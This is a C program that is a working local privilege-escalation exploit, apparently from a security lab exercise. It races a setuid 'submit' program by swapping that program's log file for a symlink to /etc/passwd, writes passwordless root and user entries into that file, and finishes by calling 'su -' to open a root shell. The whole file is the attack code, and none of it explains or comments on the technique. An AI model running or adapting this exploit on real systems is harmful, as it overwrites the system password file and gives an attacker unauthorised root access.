#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>

#define NUM_BYTES 10000000
#define TARGET "/usr/local/bin/submit"
#define PASSWORD_FILE "/etc/passwd"
#define LOG_FILE "/home/user/submit.log"
#define SUBMIT_FILE "big_file.txt"

char message[] = 
  "root::0:0:root:/root:/bin/sh\n"
  "halt::0:1001::/:/sbin/halt\n"
  "user::1000:1000::/home/user:/bin/sh\n";

int main(int argc, char *argv[]) {
  int pid;
  FILE *submit_file;
  char *args[4];
  char *env[1];
  int i;

  submit_file = fopen(SUBMIT_FILE, "w+");
  for (i = 0; i < NUM_BYTES; ++i) {
    fputc('*', submit_file);
  }
  fclose(submit_file);

  remove(LOG_FILE);

  pid = fork();
  if (pid == 0) {
    // sleep(1);

    printf("Child: Process started.\n"); 

    args[0] = TARGET;
    args[1] = SUBMIT_FILE;
    args[2] = message;
    args[3] = NULL;

    env[0] = NULL;

    printf("Child: Executing submit.\n");
    execve(args[0], args, env); 

  } else {
    printf("Parent: Process started.\n"); 

    printf("Parent: Waiting for creation of log file.\n");
    while (access(LOG_FILE, F_OK) == -1) {
      // busy wait
    }
    printf("Parent: Log file found.\n");

    remove(LOG_FILE);
    printf("Parent: Log file removed.\n");

    symlink(PASSWORD_FILE, LOG_FILE);
    printf("Parent: Log file symlinked to password file.\n");

    printf("Parent: Waiting for child to exit.\n");
    wait(NULL);

    printf("Parent: Changing user.\n");
    system("su -");
  } 
  exit(0);
}
